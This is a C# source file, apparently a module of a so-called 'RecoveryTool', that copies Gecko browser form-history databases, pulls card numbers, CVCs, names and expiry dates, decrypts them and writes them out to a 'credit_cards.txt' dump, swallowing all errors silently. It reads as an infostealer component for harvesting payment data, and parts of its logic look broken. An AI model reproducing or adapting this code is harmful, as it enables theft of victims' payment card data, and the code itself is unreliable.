using Microsoft.Data.Sqlite;
using System.Text;

namespace RecoveryTool.Recovery.Browsers.Gecko
{
    public static class GeckoCreditCards
    {
        private record CreditCardData
        {
            public string Name { get; init; }
            public string Number { get; init; }
            public string CVC { get; init; }
            public string ExpiryMonth { get; init; }
            public string ExpiryYear { get; init; }
            public long DateCreated { get; init; }
            public long DateModified { get; init; }
        }

        public static async Task RecoverAsync(string browserName, string browserRelativePath)
        {
            await GeckoCommon.RecoverDataAsync(browserName, "CreditCards", ProcessProfileAsync, "credit_cards.txt");
        }

        private static async Task<string> ProcessProfileAsync(string profilePath)
        {
            var sb = new StringBuilder();
            string formHistoryPath = Path.Combine(profilePath, "formhistory.sqlite");
            if (!File.Exists(formHistoryPath))
            {
                return string.Empty;
            }

            string tempDbPath = await GeckoCommon.CopyDatabaseToTempAsync(formHistoryPath, "formhistory");
            if (string.IsNullOrEmpty(tempDbPath)) return string.Empty;

            var creditCards = new List<CreditCardData>();
            try
            {
                using var connection = await GeckoCommon.OpenSqliteConnectionAsync(tempDbPath);
                var availableColumns = new List<string>();
                await using (var pragmaCmd = connection.CreateCommand())
                {
                    pragmaCmd.CommandText = "PRAGMA table_info(moz_formhistory);";
                    await using var reader = await pragmaCmd.ExecuteReaderAsync();
                    while (await reader.ReadAsync()) availableColumns.Add(reader.GetString(1));
                }

                var columnsToSelect = new List<string> { "fieldname", "value" };
                if (availableColumns.Contains("dateCreated")) columnsToSelect.Add("dateCreated");
                if (availableColumns.Contains("dateModified")) columnsToSelect.Add("dateModified");

                string query = $@"
                    SELECT {string.Join(", ", columnsToSelect)}
                    FROM moz_formhistory
                    WHERE fieldname IN (
                        'cc-number',
                        'cc-cvc',
                        'cc-name',
                        'cc-expiry-month',
                        'cc-expiry-year'
                    )
                    ORDER BY {(availableColumns.Contains("dateCreated") ? "dateCreated" : "ROWID")} ASC
                ";

                var tempCards = new List<Dictionary<string, string>>();
                await using (var command = new SqliteCommand(query, connection))
                await using (var reader = await command.ExecuteReaderAsync())
                {
                    while (await reader.ReadAsync())
                    {
                        var map = new Dictionary<string, string>();
                        string fieldName = reader.GetString(0);
                        string value = reader.GetString(1);
                        string dateCreated = availableColumns.Contains("dateCreated") && columnsToSelect.IndexOf("dateCreated") < reader.FieldCount
                            ? reader[columnsToSelect.IndexOf("dateCreated")]?.ToString() ?? "0"
                            : "0";
                        string dateModified = availableColumns.Contains("dateModified") && columnsToSelect.IndexOf("dateModified") < reader.FieldCount
                            ? reader[columnsToSelect.IndexOf("dateModified")]?.ToString() ?? "0"
                            : "0";
                        map[fieldName] = value;
                        map["dateCreated"] = dateCreated;
                        map["dateModified"] = dateModified;
                        tempCards.Add(map);
                    }
                }

                foreach (var cardDict in tempCards)
                {
                    var existingCard = creditCards.FirstOrDefault(
                        c => c.DateCreated.ToString() == cardDict["dateCreated"]
                    );
                    if (existingCard == null)
                    {
                        existingCard = new CreditCardData
                        {
                            Name = null,
                            Number = null,
                            CVC = null,
                            ExpiryMonth = null,
                            ExpiryYear = null,
                            DateCreated = long.Parse(cardDict["dateCreated"]),
                            DateModified = long.Parse(cardDict["dateModified"])
                        };
                        creditCards.Add(existingCard);
                    }
                    var field = cardDict.Keys.First();
                    if (field == "cc-number") existingCard = existingCard with { Number = cardDict["cc-number"] };
                    if (field == "cc-cvc") existingCard = existingCard with { CVC = cardDict["cc-cvc"] };
                    if (field == "cc-name") existingCard = existingCard with { Name = cardDict["cc-name"] };
                    if (field == "cc-expiry-month") existingCard = existingCard with { ExpiryMonth = cardDict["cc-expiry-month"] };
                    if (field == "cc-expiry-year") existingCard = existingCard with { ExpiryYear = cardDict["cc-expiry-year"] };
                    creditCards[^1] = existingCard;
                }

                foreach (var card in creditCards)
                {
                    try
                    {
                        string decryptedNumber = card.Number != null ? await GeckoCommon.DecryptAsync(card.Number) : "N/A";
                        string decryptedCVC = card.CVC != null ? await GeckoCommon.DecryptAsync(card.CVC) : "N/A";
                        string decryptedName = card.Name != null ? await GeckoCommon.DecryptAsync(card.Name) : "N/A";
                        string expiryMonth = card.ExpiryMonth ?? "N/A";
                        string expiryYear = card.ExpiryYear ?? "N/A";
                        DateTime dateCreated = GeckoCommon.UnixTimeStampToDateTime(card.DateCreated / 1000, false);
                        DateTime dateModified = GeckoCommon.UnixTimeStampToDateTime(card.DateModified / 1000, false);
                        sb.AppendLine($"Name: {decryptedName}");
                        sb.AppendLine($"Number: {decryptedNumber}");
                        sb.AppendLine($"CVC: {decryptedCVC}");
                        sb.AppendLine($"Expiry: {expiryMonth}/{expiryYear}");
                        sb.AppendLine($"Date Created: {dateCreated}");
                        sb.AppendLine($"Date Modified: {dateModified}");
                        sb.AppendLine(new string('-', 50));
                    } catch { }
                }

                if (creditCards.Count == 0) return string.Empty;
            }
            catch
            {
                return string.Empty;
            }
            return sb.ToString();
        }
    }
}
